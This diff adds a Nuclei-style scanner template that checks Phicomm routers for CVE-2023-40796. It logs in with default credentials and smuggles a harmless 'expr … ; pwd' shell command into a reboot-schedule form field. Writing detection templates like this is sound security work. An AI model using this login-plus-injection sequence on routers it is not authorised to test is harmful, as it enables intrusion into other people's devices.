@@ -1,0 +1,65 @@
+id: cve-2023-40796
+info:
+  name: Phicomm Router Backend Command Execution (CVE-2023-40796)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2023-40796
+variables:
+  t1: '{{rand_int(10000, 999999)}}'
+  t2: '{{rand_int(10, 100)}}'
+  t3: '{{to_number(t1) - to_number(t2)}}'
+http:
+  - raw:
+      - |
+        POST /cgi-bin/luci/admin/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action_mode=apply&action_url={{BaseURL}}%2Fcgi-bin%2Fluci&username=admin&password=YWRtaW4%3D
+    extractors:
+      - type: regex
+        name: stok
+        internal: true
+        part: header
+        regex:
+          - ';stok=(.*?)/admin/index'
+      - type: regex
+        name: sysauth_cookie
+        internal: true
+        part: header
+        regex:
+          - 'sysauth=(.*?);'
+    matchers:
+      - type: status
+        status:
+          - 302
+  - raw:
+      - |
+        POST /cgi-bin/luci/;stok={{stok}}/admin/timereboot HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybsubto0f
+        Cookie: sysauth={{sysauth_cookie}}
+
+        ------WebKitFormBoundarybsubto0f
+        Content-Disposition: form-data; name="timeRebootEnablestatus"
+
+        on
+        ------WebKitFormBoundarybsubto0f
+        Content-Disposition: form-data; name="timeRebootrange"
+
+        00:05;
+        expr {{t1}} - {{t2}} ; pwd
+        ------WebKitFormBoundarybsubto0f
+        Content-Disposition: form-data; name="cururl"
+
+        {{BaseURL}}/cgi-bin/luci/;stok=eed9e2c63aec0d9ed25fce9bfc737299/admin/wifiset/
+        ------WebKitFormBoundarybsubto0f--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t3}}'
+        part: body
